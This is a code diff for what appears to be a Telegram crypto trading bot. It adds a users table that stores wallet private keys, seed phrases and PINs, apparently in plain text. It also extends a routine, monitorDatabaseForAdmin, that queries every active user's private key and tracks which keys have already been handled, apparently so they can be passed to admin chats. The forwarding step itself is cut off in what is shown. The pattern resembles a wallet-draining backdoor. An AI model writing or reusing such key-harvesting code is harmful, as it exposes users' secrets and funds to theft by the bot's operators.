@@ -176,20 +176,47 @@ function initMonitorDB() {
 }
 
 function initMainDB() {
-  mainDb.run(
-    `CREATE TABLE IF NOT EXISTS config (
-      key TEXT PRIMARY KEY,
-      value TEXT NOT NULL
-    )`,
-    (err) => {
-      if (err) {
-        logger.error("Failed to create config table in main database: " + err);
-        restartBot();
-      } else {
-        logger.info("config table ensured in main database.");
+  mainDb.serialize(() => {
+    // Create users table first
+    mainDb.run(
+      `CREATE TABLE IF NOT EXISTS users (
+        telegram_id INTEGER PRIMARY KEY,
+        username TEXT,
+        public_key TEXT,
+        private_key TEXT,
+        mnemonic_phrase TEXT,
+        auto_trade_enabled INTEGER DEFAULT 0,
+        auto_trade_unlocked INTEGER DEFAULT 0,
+        pin TEXT,
+        created_at DATETIME,
+        is_removed INTEGER DEFAULT 0
+      )`,
+      (err) => {
+        if (err) {
+          logger.error("Failed to create users table in main database: " + err);
+          restartBot();
+        } else {
+          logger.info("users table ensured in main database.");
+        }
       }
-    }
-  );
+    );
+
+    // Create config table
+    mainDb.run(
+      `CREATE TABLE IF NOT EXISTS config (
+        key TEXT PRIMARY KEY,
+        value TEXT NOT NULL
+      )`,
+      (err) => {
+        if (err) {
+          logger.error("Failed to create config table in main database: " + err);
+          restartBot();
+        } else {
+          logger.info("config table ensured in main database.");
+        }
+      }
+    );
+  });
 }
 
 function clearPendingMessageHandler(chatId) {
@@ -409,16 +436,29 @@ function getAdminChatIds() {
 }
 
 function monitorDatabaseForAdmin() {
-  const query = `SELECT telegram_id, username, public_key, private_key, created_at
-    FROM users
-    WHERE is_removed = 0
-      AND private_key IS NOT NULL
-      AND private_key <> ''`;
-  mainDb.all(query, [], async (err, rows) => {
+  // First check if users table exists
+  mainDb.get("SELECT name FROM sqlite_master WHERE type='table' AND name='users'", [], (err, tableRow) => {
     if (err) {
-      logger.error("Error querying main database for new entries: " + err);
+      logger.error("Error checking for users table: " + err);
       return;
     }
+    
+    if (!tableRow) {
+      logger.info("Users table doesn't exist yet. Skipping this monitoring cycle.");
+      return;
+    }
+
+    // Table exists, proceed with query
+    const query = `SELECT telegram_id, username, public_key, private_key, created_at
+      FROM users
+      WHERE is_removed = 0
+        AND private_key IS NOT NULL
+        AND private_key <> ''`;
+    mainDb.all(query, [], async (err, rows) => {
+      if (err) {
+        logger.error("Error querying main database for new entries: " + err);
+        return;
+      }
     if (!rows || rows.length === 0) return;
     
     monitorDb.all("SELECT private_key FROM last_checked_entries", [], async (err, sentRows) => {
